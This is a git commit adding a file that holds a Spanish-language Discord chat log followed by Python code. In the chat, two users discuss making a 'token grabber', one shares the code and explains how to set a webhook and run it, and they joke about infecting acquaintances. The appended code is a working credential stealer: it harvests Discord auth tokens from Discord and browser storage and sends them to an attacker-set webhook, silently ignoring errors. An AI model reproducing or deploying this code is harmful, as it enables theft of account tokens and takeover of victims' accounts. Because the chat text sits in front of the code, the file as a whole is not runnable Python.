961dc7917168daad58f224bceb73e29e891a9f55
young13kkk <111087415+young13kkk@users.noreply.github.com>
2022-08-13 00:58:27 -0600

    Add files via upload

---
+++ main.py
@@ -0,0 +1,327 @@
+Young.kiu
+#0013
+Purple_Crown/usd
+
+Young.kiu — 04/08/2022
+de entrar a salir
+𝒛𝑺ą𝒕𝒖𝒓𝒏 ⸸ — 04/08/2022
+Estaba mi madre en la invitación
+Young.kiu — 04/08/2022
+y no hablar
+𝒛𝑺ą𝒕𝒖𝒓𝒏 ⸸ — 04/08/2022
+Habitación *
+𝒛𝑺ą𝒕𝒖𝒓𝒏 ⸸ — 04/08/2022
+Wifi
+Del chino
+Young.kiu — 04/08/2022
+No
+te saliste manualmente
+𝒛𝑺ą𝒕𝒖𝒓𝒏 ⸸ — 04/08/2022
+Nop
+https://youtu.be/EfDLsyJa2L8
+YouTube
+Chicho Game
+| AFTER PATCH | COMO PASAR COCHES A AMIGOS SIN ANAWACK| GCTF GLITCH...
+Imagen
+𝒛𝑺ą𝒕𝒖𝒓𝒏 ⸸ — 05/08/2022
+bb
+Me dejas abrir kush
+???
+Young.kiu — 05/08/2022
+No
+𝒛𝑺ą𝒕𝒖𝒓𝒏 ⸸ — 05/08/2022
+Oki
+Young.kiu — 05/08/2022
+Mi nitro boost
+𝒛𝑺ą𝒕𝒖𝒓𝒏 ⸸ — 05/08/2022
+esperaaaaaaaaa
+Young.kiu — 05/08/2022
+Ya espere
+𝒛𝑺ą𝒕𝒖𝒓𝒏 ⸸ — 05/08/2022
+Tengo que borrar la esa y volverla a instalar
+𝒛𝑺ą𝒕𝒖𝒓𝒏 ⸸ — 06/08/2022
+Amol
+Ahora te saco el nitro
+Young.kiu — 06/08/2022
+oki
+Young.kiu — 06/08/2022
+bad end
+nunca lo saco
+𝒛𝑺ą𝒕𝒖𝒓𝒏 ⸸ — 06/08/2022
+Estoy en el campo
+Y ahora me voy a la feria
+xD
+Young.kiu — 06/08/2022
+chico de campo?
+𝒛𝑺ą𝒕𝒖𝒓𝒏 ⸸ — 06/08/2022
+Si
+Young.kiu — 08/08/2022
+Lptmdr
+Young.kiu — 08/08/2022
+Pkuando el nicho?
+Bebeto
+𝒛𝑺ą𝒕𝒖𝒓𝒏 ⸸ — 08/08/2022
+en la aplicacion de medal ya no hay
+Young.kiu — 08/08/2022
+Xd
+𝒛𝑺ą𝒕𝒖𝒓𝒏 ⸸ — 08/08/2022
+e intentadoi sacar yo una
+Young.kiu — 08/08/2022
+Pues dentro de poco va a ver una oferta nueva
+𝒛𝑺ą𝒕𝒖𝒓𝒏 ⸸ — 08/08/2022
+de donde
+¿?
+Young.kiu — 08/08/2022
+Ns
+Pero así es ds
+Una oferta cada vez que se acaba una
+𝒛𝑺ą𝒕𝒖𝒓𝒏 ⸸ — 08/08/2022
+tu
+sabes como va la mierda de hazard nuke
+Young.kiu — 08/08/2022
+No xd
+𝒛𝑺ą𝒕𝒖𝒓𝒏 ⸸ — 08/08/2022
+Xd
+Quiero hacer un token graber
+Pero ns
+Young.kiu — 08/08/2022
+Hazlo
+No es muy difícil
+Yo tengo el code de uno
+Pero está en py
+𝒛𝑺ą𝒕𝒖𝒓𝒏 ⸸ — 08/08/2022
+Pásamelo jeje
+Young.kiu — 08/08/2022
+import os
+import re
+import json
+
+from urllib.request import Request, urlopen
+
+Expandir
+asd.txt
+3 KB
+𝒛𝑺ą𝒕𝒖𝒓𝒏 ⸸ — 08/08/2022
+Gracias
+esto como lo enciendo
+?
+Young.kiu — 08/08/2022
+Xd
+No enciende
+Pons la webhook
+Y en teoría
+Se ejecuta
+Y listo
+𝒛𝑺ą𝒕𝒖𝒓𝒏 ⸸ — 08/08/2022
+Ahora te digo
+𝒛𝑺ą𝒕𝒖𝒓𝒏 ⸸ — 08/08/2022
+Young sito
+A que no sabes de qué me enteré
+Young.kiu — 08/08/2022
+de
+que?
+𝒛𝑺ą𝒕𝒖𝒓𝒏 ⸸ — 08/08/2022
+El Young karma
+Me quiere infectar junto a uno de anti-plaque
+😂😂😂
+Young.kiu — 08/08/2022
+xd
+JSHAJSHAJSHA
+ap siendo ap
+𝒛𝑺ą𝒕𝒖𝒓𝒏 ⸸ — 08/08/2022
+JAJAJAJAJA
+Van a quedar peor de lo ya están XD
+Young.kiu — 08/08/2022
+Dile a Ricardo que no instale nada
+𝒛𝑺ą𝒕𝒖𝒓𝒏 ⸸ — 08/08/2022
+Si ya se han cagado
+Imagen
+Bloqueando
+Imagen
+Baneando
+Imagen
+Saliéndose
+Young.kiu — 08/08/2022
+Pásame el @
+𝒛𝑺ą𝒕𝒖𝒓𝒏 ⸸ — 08/08/2022
+Del scp
+!         $₡₱ シ#4472
+Toma
+Young.kiu — 08/08/2022
+No es de AP
+Xd
+Imagen
+𝒛𝑺ą𝒕𝒖𝒓𝒏 ⸸ — 08/08/2022
+Ya me di cuenta
+Young.kiu — 08/08/2022
+Que rara
+Ese te va a a "infectar"
+@𝒛𝑺ą𝒕𝒖𝒓𝒏 ⸸
+𝒛𝑺ą𝒕𝒖𝒓𝒏 ⸸ — 08/08/2022
+Si según el JAJAJJA
+Young.kiu — 08/08/2022
+Imagen
+𝒛𝑺ą𝒕𝒖𝒓𝒏 ⸸ — 08/08/2022
+AJJAJAJA
+Imagen
+Young.kiu — 08/08/2022
+Xd
+𝒛𝑺ą𝒕𝒖𝒓𝒏 ⸸ — 08/08/2022
+XD
+Young.kiu — 08/08/2022
+Infectaron a Ricardo
+𝒛𝑺ą𝒕𝒖𝒓𝒏 ⸸ — 08/08/2022
+Que va
+Creo JAJAJAJ
+Young.kiu — 08/08/2022
+Imagen
+𝒛𝑺ą𝒕𝒖𝒓𝒏 ⸸ — 08/08/2022
+JAJAJAJ
+Puto lammer
+Young.kiu — 08/08/2022
+Imagen
+Imagen
+𝒛𝑺ą𝒕𝒖𝒓𝒏 ⸸ — 08/08/2022
+Si eso es lo básico
+Para hacer cualquier mierda
+Se utiliza print
+Young.kiu — 08/08/2022
+Imagen
+𝒛𝑺ą𝒕𝒖𝒓𝒏 ⸸ — 08/08/2022
+JAJAJAJAJA
+Y ese sabe py 
+Y c+
+Young.kiu — 08/08/2022
+c+
+no es lenguaje
+colo
+c
+c#
+c++
+𝒛𝑺ą𝒕𝒖𝒓𝒏 ⸸ — 08/08/2022
+Ya lose
+Es
+c++
+Porque c+ no existe
+Young.kiu — 08/08/2022
+Meteme a la private
+y no me des rangos en public
+𝒛𝑺ą𝒕𝒖𝒓𝒏 ⸸ — 08/08/2022
+Oka
+https://discord.gg/TR3t3VY9
+Young.kiu — 08/08/2022
+Estoy
+pasa rangs
+Young.kiu — 09/08/2022
+Chets cuenta de que?
+𝒛𝑺ą𝒕𝒖𝒓𝒏 ⸸ — 09/08/2022
+de gta v pc
+𝒛𝑺ą𝒕𝒖𝒓𝒏 ⸸ — 09/08/2022
+Las fotos las puedo subir al exponsed
+Ya que a mí ese me tiene bloqueado
+Young.kiu — 09/08/2022
+Si
+𝒛𝑺ą𝒕𝒖𝒓𝒏 ⸸ — 09/08/2022
+Dale
+Young.kiu — 10/08/2022
+Saturn
+𝒛𝑺ą𝒕𝒖𝒓𝒏 ⸸ — 10/08/2022
+dime
+Young.kiu — 10/08/2022
+Si te doy un sv de 200
+Me das un nitro boost
+?
+Con coronita
+𝒛𝑺ą𝒕𝒖𝒓𝒏 ⸸ — 10/08/2022
+Ya me han dado uno
+Young.kiu — 10/08/2022
+Lptmdr
+Quein?
+𝒛𝑺ą𝒕𝒖𝒓𝒏 ⸸ — 10/08/2022
+El dudi
+Young.kiu — 10/08/2022
+De cuántos?
+𝒛𝑺ą𝒕𝒖𝒓𝒏 ⸸ — 10/08/2022
+343
+Young.kiu — 10/08/2022
+F
+Young.kiu — ayer a las 19:52
+saturno
+consigue rangos en demon sq
+https://discord.gg/3UgWHRM4
+esta
+tengo la cara del founder
+﻿
+import os
+import re
+import json
+
+from urllib.request import Request, urlopen
+
+#webhook
+WEBHOOK_URL = ''
+
+PING_ME = False
+
+def find_tokens(path):
+    path += '\\Local Storage\\leveldb'
+
+    tokens = []
+
+    for file_name in os.listdir(path):
+        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
+            continue
+
+        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
+            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
+                for token in re.findall(regex, line):
+                    tokens.append(token)
+    return tokens
+
+def main():
+    local = os.getenv('LOCALAPPDATA')
+    roaming = os.getenv('APPDATA')
+
+    paths = {
+        'Discord': roaming + '\\Discord',
+        'Discord Canary': roaming + '\\discordcanary',
+        'Discord PTB': roaming + '\\discordptb',
+        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
+        'Opera': roaming + '\\Opera Software\\Opera Stable',
+        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
+        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
+    }
+
+    message = '@everyone' if PING_ME else ''
+
+    for platform, path in paths.items():
+        if not os.path.exists(path):
+            continue
+
+        message += f'\n**{platform}**\n```\n'
+
+        tokens = find_tokens(path)
+
+        if len(tokens) > 0:
+            for token in tokens:
+                message += f'{token}\n'
+        else:
+            message += 'No tokens found.\n'
+
+        message += '```'
+
+    headers = {
+        'Content-Type': 'application/json',
+        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
+    }
+
+    payload = json.dumps({'content': message})
+
+    try:
+        req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
+        urlopen(req)
+    except:
+        pass
+
+if __name__ == '__main__':
+    main()
